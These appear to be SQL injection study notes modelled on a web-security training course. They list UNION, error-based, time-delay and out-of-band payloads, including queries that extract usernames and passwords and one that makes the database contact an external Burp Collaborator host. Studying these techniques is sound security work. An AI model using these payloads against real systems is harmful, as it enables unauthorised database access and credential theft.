# Web Security resources 


#### Retrieving data from other database tables

```sql
>  ' UNION SELECT username, password FROM users-- 
```
For a UNION query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

##### Determining the number of columns required in an SQL injection UNION attack

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 1-- ... ERROR!

' UNION SELECT NULL-- ERROR!
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL-- ERROR!
```

#### Examining the database

```sql
> SELECT * FROM information_schema.tables 
```

#### Blind SQL injection vulnerabilities

##### Exploiting blind SQL injection by triggering conditional responses

```sql
> xyz' UNION SELECT 'a' WHERE 1=1--
> xyz' UNION SELECT 'a' WHERE 1=2-- 

> xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--
> xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 't'-- 
...
> xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) = 's'-- 
```
##### Inducing conditional responses by triggering SQL errors

```sql
> xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
> xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END-- 
> xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) > 'm') then 1/0 else null end from users-- 
> ... TO_CHAR(1/0) ... 
```

##### Exploiting blind SQL injection by triggering time delays

```sql
> '; IF (1=2) WAITFOR DELAY '0:0:10'--
> '; IF (1=1) WAITFOR DELAY '0:0:10'-- 
> '; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'-- 

> dbms_pipe.receive_message(('a'),10) Oracle
> WAITFOR DELAY '0:0:10' Microsoft
> SELECT pg_sleep(10) PostgreSQL
> SELECT sleep(10) MySQL
```

##### Exploiting blind SQL injection using out-of-band (OAST) techniques

```sql
> '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'-- 
```

#### How to detect SQL injection vulnerabilities

```sql
> '
> OR 1=1 | OR 1=2
```

#### SQL injection in different parts of the query

- In UPDATE statements, within the updated values or the WHERE clause.
- In INSERT statements, within the inserted values.
- In SELECT statements, within the table or column name.
- In SELECT statements, within the ORDER BY clause.

#### Second-order SQL injection

 First-order SQL injection arises where the application takes user input from an HTTP request and, in the course of processing that request, incorporates the input into an SQL query in an unsafe way.

In second-order SQL injection (also known as stored SQL injection), the application takes user input from an HTTP request and stores it for future use. 

#### Database-specific factors

- [Cheatsheet of different databases](https://portswigger.net/web-security/sql-injection/cheat-sheet)












